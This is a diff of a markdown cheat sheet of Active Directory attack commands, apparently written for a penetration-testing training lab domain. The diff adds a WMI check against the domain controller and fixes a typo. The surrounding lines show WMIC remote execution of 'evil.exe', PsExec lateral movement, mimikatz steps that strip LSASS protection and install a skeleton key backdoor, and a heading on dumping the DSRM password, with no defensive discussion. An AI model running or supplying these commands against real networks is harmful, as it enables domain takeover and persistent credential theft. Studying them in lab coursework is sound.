@@ -30,6 +30,9 @@ ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
 ```
 wmi service (HOST + RPCSS)
 ```powershell
+# check
+gwmi -Class win32_computersystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
 wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"
 
 .\PsExec.exe \\dcorp-dc.dollarcorp.moneycorp.local ipconfig
@@ -76,7 +79,7 @@ mimikatz # !processprotect /process:lsass.exe /remove
 mimikatz # misc::skeleton
 mimikatz # !-
 ```
-Note that above would be very noisy in logs - Service installation (Kernel mode driver
+Note that above would be very noisy in logs - Service installation (Kernel mode driver)
 
 ## DSRM
 Dump DSRM password (needs DA privs)
